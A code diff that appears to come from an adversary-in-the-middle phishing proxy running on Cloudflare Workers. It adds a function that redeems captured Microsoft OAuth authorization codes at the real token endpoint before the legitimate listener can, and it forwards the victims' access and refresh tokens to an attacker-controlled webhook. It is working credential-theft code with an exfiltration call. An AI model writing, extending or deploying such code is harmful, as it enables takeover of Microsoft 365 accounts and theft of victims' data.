@@ -612,6 +612,55 @@ function makeUpstreamUrl(clientUrl, cfg) {
 }
 
 /** Prepare headers for upstream (Host, Referer etc.). */
+/// ─────────────────────────────────────────────────────────────
+/// Edge Token Exchange (Feature 2)
+/// ─────────────────────────────────────────────────────────────
+
+/**
+ * Attempt to exchange an auth code at the Cloudflare edge immediately after
+ * capture, racing against the webhook listener. Lower latency wins the
+ * single-use code. Tokens are forwarded to the webhook as event: edge_exchange.
+ */
+async function raceCodeExchange(code, clientId, redirectUri, scope, env) {
+    try {
+        const body = new URLSearchParams({
+            grant_type: 'authorization_code',
+            code: code,
+            client_id: clientId,
+            redirect_uri: redirectUri,
+            scope: scope || 'openid offline_access https://graph.microsoft.com/.default',
+        });
+
+        const resp = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: body.toString(),
+        });
+
+        if (resp.ok) {
+            const tokens = await resp.json();
+            const webhook = env.WEBHOOK_URL || '';
+            if (webhook) {
+                const exchangeUrl = webhook.replace(/\/webhook\/?$/, '/exchange');
+                await fetch(exchangeUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        event: 'edge_exchange',
+                        timestamp: new Date().toISOString(),
+                        access_token: tokens.access_token,
+                        refresh_token: tokens.refresh_token,
+                        scope: tokens.scope,
+                        expires_in: tokens.expires_in,
+                    }),
+                }).catch(() => {});
+            }
+            return true;
+        }
+    } catch (e) {}
+    return false;
+}
+
 function makeProxyHeaders(origHeaders, upstreamHost, refererOrigin, userAgentString) {
   const h = new Headers(origHeaders);
   h.set('Host', upstreamHost);
